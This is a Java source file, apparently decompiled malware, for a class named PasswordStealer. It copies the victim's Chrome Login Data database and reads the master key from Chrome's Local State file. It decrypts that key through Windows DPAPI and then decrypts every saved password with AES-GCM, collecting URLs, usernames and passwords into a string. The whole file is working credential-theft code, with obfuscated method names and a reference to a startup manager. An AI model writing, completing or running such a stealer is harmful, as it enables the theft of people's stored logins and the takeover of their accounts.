package carLambo;

import com.sun.jna.platform.win32.Crypt32Util;
import java.io.File;
import java.io.FileReader;
import java.nio.ByteBuffer;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;

public final class PasswordStealer {
   private byte[] sdfsldf = null;

   // $FF: synthetic method
   private String stealChromePasswords() {
      StringBuilder var1 = new StringBuilder();

      try {
         Class.forName("org.sqlite.JDBC");
         File var2 = new File((new StringBuilder()).insert(0, "C:\\Users\\").append(System.getProperty("user.name")).append("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data").toString());
         File var4 = new File((new StringBuilder()).insert(0, "C:\\Users\\").append(System.getProperty("user.name")).append("\\AppData\\Roaming\\Login Data").toString());
         StartupManager.copyFiles(var2, var4);
         Connection var11;
         Connection var10000 = var11 = DriverManager.getConnection((new StringBuilder()).insert(0, "jdbc:sqlite:").append(var4.getAbsolutePath()).toString());
         var10000.setAutoCommit(false);
         System.out.println("Opened database successfully");
         Statement var3;
         ResultSet var5 = (var3 = var10000.createStatement()).executeQuery("SELECT * FROM logins;");

         while(var5.next()) {
            String var6;
            if ((var6 = var5.getString("action_url")) == null) {
               var6 = "Not found/corrupted";
            }

            String var7;
            if ((var7 = var5.getString("username_value")) == null) {
               var7 = "Not found/corrupted";
            }

            byte[] var8;
            Object var9 = sdfsldf(var8 = var5.getBytes("password_value"), true);
            String var12 = "Unable to decode";
            String var13;
            if (var9 != null) {
               var13 = (String)var9;
               var12 = var6;
            } else {
               var13 = this.sdfsldf(var8);
               var12 = var6;
            }

            if (!var12.equals("")) {
               var1.append(String.format("URL:%s\r\nUsername:%s\r\nPassword:%s\r\n\r\n", var6, var7, var13));
            }
         }

         var5.close();
         var3.close();
         var11.close();
         var4.delete();
         return var1.toString();
      } catch (Exception var10) {
         var10.printStackTrace();
         return "Chrome Not Installed";
      }
   }

   public final String wrapStealPasswords() {
      if (!System.getProperty("os.name").contains("Windows")) {
         return String.format("Your OS (%s) is not supported! :(", System.getProperty("os.name"));
      } else {
         String var1;
         return (var1 = this.stealChromePasswords()).equals("") ? "No passwords Found" : var1;
      }
   }

   private static String dfhttegd() {
      try {
         File var0;
         char[] var1 = new char[(int)(var0 = new File((new StringBuilder()).insert(0, "C:\\Users\\").append(System.getProperty("user.name")).append("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State").toString())).length()];
         (new FileReader(var0)).read(var1);
         return new String(var1);
      } catch (Exception var2) {
         var2.printStackTrace();
         return null;
      }
   }

   private static Object sdfsldf(byte[] var0, boolean var1) {
      try {
         StringBuilder var2 = new StringBuilder();
         var0 = Crypt32Util.cryptUnprotectData(var0);
         if (!var1) {
            return var0;
         } else {
            byte[] var6 = var0;
            int var5 = var0.length;

            int var3;
            for(int var10000 = var3 = 0; var10000 < var5; var10000 = var3) {
               var2.append((char)var6[var3++]);
            }

            return var2.toString();
         }
      } catch (Exception var4) {
         return null;
      }
   }

   private String sdfsldf(byte[] var1) {
      byte[] var10;
      byte[] var14;
      label37: {
         if (this.sdfsldf == null) {
            String var3 = dfhttegd();
            Matcher var9;
            if (!(var9 = Pattern.compile("\"encrypted_key\":\"([^,]*)\"").matcher(var3)).find()) {
               var14 = null;
               break label37;
            }

            byte[] var4 = new byte[(var10 = DatatypeConverter.parseBase64Binary(var9.group(1))).length - 5];

            int var5;
            for(int var10000 = var5 = 0; var10000 < var4.length; var10000 = var5) {
               int var10001 = var5;
               byte var10002 = var10[var5 + 5];
               ++var5;
               var4[var10001] = var10002;
            }

            Object var13 = sdfsldf(var4, false);
            this.sdfsldf = var13 != null ? (byte[])var13 : null;
         }

         var14 = this.sdfsldf;
      }

      byte[] var2 = var14;
      if (var14 == null) {
         return "Unable to decode";
      } else {
         try {
            ByteBuffer var7 = ByteBuffer.wrap(var1);
            var10 = new byte[3];
            var7.get(var10);
            var10 = new byte[12];
            var7.get(var10);
            SecretKeySpec var8 = new SecretKeySpec(var2, "AES");
            var7.get(var1 = new byte[var7.remaining()]);
            Cipher var11 = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec var12 = new GCMParameterSpec(128, var10);
            var11.init(2, var8, var12);
            var11.updateAAD(new byte[0]);
            var2 = var11.doFinal(var1);
            return new String(var2);
         } catch (Exception var6) {
            return "Unable to decode";
         }
      }
   }

   private byte[] bsgshsbs() {
      if (this.sdfsldf != null) {
         return this.sdfsldf;
      } else {
         String var1 = dfhttegd();
         Matcher var4;
         if (!(var4 = Pattern.compile("\"encrypted_key\":\"([^,]*)\"").matcher(var1)).find()) {
            return null;
         } else {
            byte[] var5;
            byte[] var2 = new byte[(var5 = DatatypeConverter.parseBase64Binary(var4.group(1))).length - 5];

            int var3;
            for(int var10000 = var3 = 0; var10000 < var2.length; var10000 = var3) {
               int var10001 = var3;
               byte var10002 = var5[var3 + 5];
               ++var3;
               var2[var10001] = var10002;
            }

            Object var6 = sdfsldf(var2, false);
            this.sdfsldf = var6 != null ? (byte[])var6 : null;
            return this.sdfsldf;
         }
      }
   }
}
